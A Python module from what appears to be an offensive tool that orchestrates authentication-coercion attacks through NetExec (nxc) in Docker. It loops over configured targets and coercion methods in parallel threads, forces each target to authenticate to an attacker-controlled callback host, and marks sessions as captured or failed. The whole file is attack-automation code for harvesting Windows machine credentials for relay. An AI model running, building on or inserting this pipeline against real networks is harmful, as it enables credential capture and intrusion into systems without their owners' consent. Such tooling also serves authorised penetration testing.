"""Coercion pipeline using nxc Docker containers."""
from __future__ import annotations

import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List

from btc_relay_module_nxc_impckt.config import AppConfig
from btc_relay_module_nxc_impckt.controller.nxc_ctrl import NxcController
from btc_relay_module_nxc_impckt.logger import get_logger, jsonl_event
from btc_relay_module_nxc_impckt.session import SessionRegistry, SessionStatus

logger = get_logger()


class CoercePipeline:
    def __init__(self, cfg: AppConfig, registry: SessionRegistry) -> None:
        self.cfg = cfg
        self.registry = registry
        self.nxc = NxcController(cfg)

    def run(self) -> None:
        if not self.cfg.coerce.enabled or not self.cfg.coerce.targets:
            logger.info("Coercion disabled or no targets")
            return

        logger.info(f"Starting coercion against {len(self.cfg.coerce.targets)} targets")
        with ThreadPoolExecutor(max_workers=self.cfg.coerce.workers) as executor:
            futures = {}
            for target in self.cfg.coerce.targets:
                for method in self.cfg.coerce.methods:
                    sess = self.registry.create(
                        coerce_target=target,
                        coerce_method=method,
                        status=SessionStatus.COERCING,
                    )
                    future = executor.submit(
                        self._coerce_one,
                        sess.id,
                        target,
                        method,
                        self.cfg.coerce.callback_host,
                        getattr(self.cfg.coerce, "always", False),
                    )
                    futures[future] = sess.id

            for future in as_completed(futures):
                sid = futures[future]
                try:
                    success, stdout = future.result()
                    self.registry.transition(
                        sid,
                        SessionStatus.CAPTURED if success else SessionStatus.FAILED,
                    )
                    jsonl_event(
                        "coerce_result",
                        session_id=sid,
                        success=success,
                        stdout_preview=stdout[:500],
                    )
                except Exception:
                    logger.exception(f"Coerce exception for session {sid}")
                    self.registry.transition(sid, SessionStatus.FAILED, error="exception")

    def _coerce_one(self, sid: str, target: str, method: str, callback: str, always: bool = False) -> tuple[bool, str]:
        logger.info(f"[Coerce] {sid} {method} -> {target}")
        success, stdout = self.nxc.coerce(target, method, callback, always=always)
        time.sleep(self.cfg.coerce.delay_between)
        return success, stdout
